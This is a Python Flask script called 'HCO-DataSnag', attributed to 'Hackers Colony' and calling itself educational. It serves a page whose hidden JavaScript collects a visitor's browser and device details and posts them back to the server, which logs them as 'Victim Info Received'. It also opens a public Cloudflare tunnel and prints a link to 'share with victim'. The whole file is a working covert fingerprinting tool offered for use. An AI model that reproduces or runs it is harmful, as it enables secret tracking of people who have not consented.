import os
import time
import json
import flask
import threading
from flask import Flask, request

app = Flask(__name__)

data_store = []

@app.route('/')
def index():
    return '''
    <h1>HCO-DataSnag</h1>
    <p>This is an educational tool by <b>Hackers Colony</b>.</p>
    <script>
    const data = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: {
            width: screen.width,
            height: screen.height
        },
        url: window.location.href
    };
    fetch("/collect", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
    </script>
    '''

@app.route('/collect', methods=['POST'])
def collect():
    try:
        info = request.get_json()
        data_store.append(info)
        print(f"[+] Victim Info Received:\n{json.dumps(info, indent=4)}\n")
    except Exception as e:
        print(f"[!] Error parsing victim data: {e}")
    return "OK"

def run_flask():
    app.run(host="0.0.0.0", port=5050)

def start_cloudflared():
    os.system("pkill cloudflared > /dev/null 2>&1")
    os.system("cloudflared tunnel --url http://localhost:5050 > cf.log 2>&1 &")
    time.sleep(8)

    try:
        with open("cf.log", "r") as file:
            content = file.read()
            for line in content.splitlines():
                if "trycloudflare.com" in line:
                    link = line.strip().split(" ")[-1]
                    print(f"[✓] Share this link with victim: {link}")
                    return
    except:
        pass

    print("[×] Failed to get Cloudflare URL. Make sure tunnel started properly.")

def main():
    print("[•] Installing requirements...")
    os.system("pip install flask > /dev/null 2>&1")
    print("[•] Redirecting to YouTube in 8 seconds...")
    time.sleep(8)
    os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("Press ENTER after subscribing to continue...")

    print("[•] Starting Flask server...")
    threading.Thread(target=run_flask).start()
    time.sleep(4)

    print("[•] Starting Cloudflare tunnel...")
    start_cloudflared()

if __name__ == "__main__":
    main()
